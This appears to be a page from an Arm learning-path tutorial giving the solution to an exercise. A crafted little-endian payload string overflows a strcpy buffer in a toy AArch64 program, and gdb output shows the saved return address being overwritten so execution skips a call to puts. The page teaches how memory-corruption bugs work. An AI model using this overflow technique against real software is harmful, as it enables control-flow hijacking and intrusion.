---
title: Redirect control flow - answer to the exercise
weight: 7

### FIXED, DO NOT MODIFY
layout: learningpathall
---


One string that could be a solution to exercise 3 at the end of the previous
section is:

```
$'0123456789012345\x20\x08\xaa\xaa\xaa\xaa\x00\x00'
```

We created this string by:

1. First filling the string with arbitrary characters for bytes 0 till 15.

2. Starting at byte 16, we fill in the address we want the return address to
   take. One special consideration to take is that we are working on a
   little-endian target. Therefore, we have to reverse the order of the bytes
   of the address in the string.

Let's see if it works:

```bash { command_line="root@7a8fb34f810e:/armlearningpaths|2-30" }
./redirect1 $'0123456789012345\x20\x08\xaa\xaa\xaa\xaa\x00\x00'
0123456789012345
```

Success! The program no longer prints the string
`"The string on the command line was: "`!

Time for a little celebration: ðŸŽ‰

Now let's check in detail by stepping through the program that this is working
as we expect:

```bash { command_line="root@7a8fb34f810e:/armlearningpaths|2-30" }
gdb --args ./redirect1 $'0123456789012345\x20\x08\xaa\xaa\xaa\xaa\x00\x00'
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "aarch64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./redirect1...
```

```text { output_lines = "2-30" }
(gdb) break f
Breakpoint 1 at 0x7e4: file redirect1.c, line 8.
```

```text { output_lines = "2-30" }
(gdb) run
Starting program: /armlearningpaths/redirect1 0123456789012345\
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".

Breakpoint 1, f (src=src@entry=0xfffffffff927 "0123456789012345 \b\252\252\252\252") at redirect1.c:8
8           strcpy(buffer, src);
```

```text { output_lines = "2-30" }
(gdb) disass f
Dump of assembler code for function f:
   0x0000aaaaaaaa07d4 <+0>:     sub     sp, sp, #0x20
   0x0000aaaaaaaa07d8 <+4>:     stp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07dc <+8>:     add     x29, sp, #0x10
   0x0000aaaaaaaa07e0 <+12>:    mov     x1, x0
=> 0x0000aaaaaaaa07e4 <+16>:    add     x0, sp, #0x8
   0x0000aaaaaaaa07e8 <+20>:    bl      0xaaaaaaaa0680 <strcpy@plt>
   0x0000aaaaaaaa07ec <+24>:    ldp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07f0 <+28>:    ldrb    w0, [sp, #10]
   0x0000aaaaaaaa07f4 <+32>:    add     sp, sp, #0x20
   0x0000aaaaaaaa07f8 <+36>:    ret
End of assembler dump.
```

```text { output_lines = "2-30" }
(gdb) x/4gx $sp
0xfffffffff570: 0x0000fffffffff728      0x0000000000000002
0xfffffffff580: 0x0000fffffffff590      0x0000aaaaaaaa0814
```

We see that before the buffer overflow in `strcpy` is executed, the stored value
of `x30` on the stack is as it should be: `0xaaaaaaaa0814`.

```text { output_lines = "2-30" }
(gdb) nexti 2
9           return buffer[2];
```

```text { output_lines = "2-30" }
(gdb) disass f
Dump of assembler code for function f:
   0x0000aaaaaaaa07d4 <+0>:     sub     sp, sp, #0x20
   0x0000aaaaaaaa07d8 <+4>:     stp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07dc <+8>:     add     x29, sp, #0x10
   0x0000aaaaaaaa07e0 <+12>:    mov     x1, x0
   0x0000aaaaaaaa07e4 <+16>:    add     x0, sp, #0x8
   0x0000aaaaaaaa07e8 <+20>:    bl      0xaaaaaaaa0680 <strcpy@plt>
=> 0x0000aaaaaaaa07ec <+24>:    ldp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07f0 <+28>:    ldrb    w0, [sp, #10]
   0x0000aaaaaaaa07f4 <+32>:    add     sp, sp, #0x20
   0x0000aaaaaaaa07f8 <+36>:    ret
End of assembler dump.
```

```text { output_lines = "2-30" }
(gdb) x/4gx $sp
0xfffffffff570: 0x0000fffffffff728      0x3736353433323130
0xfffffffff580: 0x3534333231303938      0x0000aaaaaaaa0820
```

After the buffer overflow has happened in `strcpy`, the stored value of `x30` on
the stack has changed indeed to the value `oxaaaaaaaa0820`.

```text { output_lines = "2-30" }
(gdb) nexti 3
0x0000aaaaaaaa07f8      9           return buffer[2];
```

```text { output_lines = "2-30" }
(gdb) disass f
Dump of assembler code for function f:
   0x0000aaaaaaaa07d4 <+0>:     sub     sp, sp, #0x20
   0x0000aaaaaaaa07d8 <+4>:     stp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07dc <+8>:     add     x29, sp, #0x10
   0x0000aaaaaaaa07e0 <+12>:    mov     x1, x0
   0x0000aaaaaaaa07e4 <+16>:    add     x0, sp, #0x8
   0x0000aaaaaaaa07e8 <+20>:    bl      0xaaaaaaaa0680 <strcpy@plt>
   0x0000aaaaaaaa07ec <+24>:    ldp     x29, x30, [sp, #16]
   0x0000aaaaaaaa07f0 <+28>:    ldrb    w0, [sp, #10]
   0x0000aaaaaaaa07f4 <+32>:    add     sp, sp, #0x20
=> 0x0000aaaaaaaa07f8 <+36>:    ret
End of assembler dump.
```

```text { output_lines = "2-30" }
(gdb) stepi
main (argc=<optimized out>, argv=<optimized out>) at redirect1.c:16
16          puts(chars);
```

```text { output_lines = "2-30" }
(gdb) disass
Dump of assembler code for function main:
   0x0000aaaaaaaa07fc <+0>:     stp     x29, x30, [sp, #-32]!
   0x0000aaaaaaaa0800 <+4>:     str     x19, [sp, #16]
   0x0000aaaaaaaa0804 <+8>:     mov     x29, sp
   0x0000aaaaaaaa0808 <+12>:    ldr     x19, [x1, #8]
   0x0000aaaaaaaa080c <+16>:    mov     x0, x19
   0x0000aaaaaaaa0810 <+20>:    bl      0xaaaaaaaa07d4 <f>
   0x0000aaaaaaaa0814 <+24>:    adrp    x0, 0xaaaaaaaa0000
   0x0000aaaaaaaa0818 <+28>:    add     x0, x0, #0x850
   0x0000aaaaaaaa081c <+32>:    bl      0xaaaaaaaa0670 <puts@plt>
=> 0x0000aaaaaaaa0820 <+36>:    mov     x0, x19
   0x0000aaaaaaaa0824 <+40>:    bl      0xaaaaaaaa0670 <puts@plt>
   0x0000aaaaaaaa0828 <+44>:    ldr     x19, [sp, #16]
   0x0000aaaaaaaa082c <+48>:    mov     w0, wzr
   0x0000aaaaaaaa0830 <+52>:    ldp     x29, x30, [sp], #32
   0x0000aaaaaaaa0834 <+56>:    ret
End of assembler dump.
(gdb)
```

And indeed, rather than returning to `0xaaaaaaaa0814`, the instruction after the call to function `f` has returned to
`0xaaaaaaaa0820`, skipping the first call to `puts`.
